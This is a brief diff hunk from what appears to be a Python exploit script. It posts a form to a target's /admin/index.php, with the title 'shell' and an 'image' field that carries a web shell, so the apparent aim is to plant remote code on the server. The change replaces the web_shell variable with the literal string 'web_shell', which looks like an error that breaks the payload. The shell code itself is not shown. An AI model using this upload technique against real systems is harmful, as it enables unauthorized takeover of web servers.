@@ -93,7 +93,7 @@ for s in strings:
         payload = target + "/admin/index.php"
         request = requests.post(payload, data= {
             'title':'shell',
-            'image':web_shell,
+            'image':'web_shell',
             'category':'1',
             'Add':'Add'
 
